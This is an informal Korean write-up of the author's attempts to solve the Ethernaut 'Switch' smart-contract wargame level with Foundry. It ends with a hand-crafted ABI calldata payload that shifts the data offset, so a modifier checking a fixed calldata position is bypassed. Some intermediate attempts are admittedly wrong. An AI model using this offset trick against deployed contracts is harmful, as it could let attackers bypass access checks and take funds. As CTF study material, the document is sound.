# Ethernaut Foundry로 풀기

## 29. Switch ***

![Level29설명](../img/Level29.png)


flipSwitch를 실행하면 되는거 같은데 
onlyOff modifier가 걸려있음. 
trunSwitchOn 이랑 trunSwitchOff에는 onlyThis modifier있음.

bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
 이게 0x20606e15 이거인데 
 0x20606e15를 섞어 넣어서 onlyOff modifier를 통과해서
turnSwitchOn()의 function selector 0x76227e12 이게 나오게 해야함. 

내 생각에는 SWAP이라는 opcode를 이용해서 처음 앞에는 turnSwitchOff fs가 들어가고 
그 다음에 swap을 해서 turnSwitchOn이 실행되는 bytescode를 작성해야함. 

push8 0x20606e15
push8 0x76227e12
swap1
pop 

63  20606e15
63  76227e12
90 
50 

여기까지하니까 에러발생. 

60 00  
52
60 20 
60 00 
f3 

여기까지 추가 

6320606e156376227e12905060005260206000f3 
=> 이거 돌리면 0000000000000000000000000000000000000000000000000000000076227e12 이거 나옴 
=> 0x76227e12는 turnSwitchOn function selector

0x20606e156320606e156376227e12905060005260206000f3
잎에 20606e15 추가해서 실행해보니까 우선 
modifier자체는 통과했음 

SWAP을 쓰려고했는데  안써도될듯

처음에는 opcode이용해서 해보려고했었음.

!! 계속 0x20606e15로 시작을 하려고했는데 
60446320606e15526376227e1260005260206000f3

        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        
selector[0] 이게 offselector와 같으면 되는것. 


abi.encodeWithSelecotr 랑 contract call 이용해서 해결해보기.! 

```
0x
30c13ade
0000000000000000000000000000000000000000000000000000000000000030 
0000000000000000000000000000000000000000000000000000000476227e12 
20606e1500000000000000000000000000000000000000000000000000000000
```
이렇게하니까 
```
    ├─ [349] 0x23DD9da2FF28551Ba5f09BafaE4c9348bEdAbD2C::flipSwitch(0x76227e12)
    │   └─ ← [Revert] panic: memory allocation error (0x41)
```
에러가 발생했음 처음등장한 에러 flipSwitch에는 turnSwitchOn fs가 들어갔음. 
맞추고 다시보니까 1c, 04, 이런에들이 32bytes한자리씩 차지해야지 그 의미가 있는건데 
76227e12 얘랑 같은 줄에있으니까 에러가 생기는거.


```
bytes memory payload = abi.encodePacked(
    hex"30c13ade",
    hex"0000000000000000000000000000000000000000000000000000000000000060",
    hex"0000000000000000000000000000000000000000000000000000000000000000",
    hex"20606e1500000000000000000000000000000000000000000000000000000000",
    hex"0000000000000000000000000000000000000000000000000000000000000004",
    hex"76227e1200000000000000000000000000000000000000000000000000000000"
        );
```

앞으로 보내느게 아니라 뒤로 보내야한다.!!!

레퍼런스1 https://www.rareskills.io/post/abi-encoding

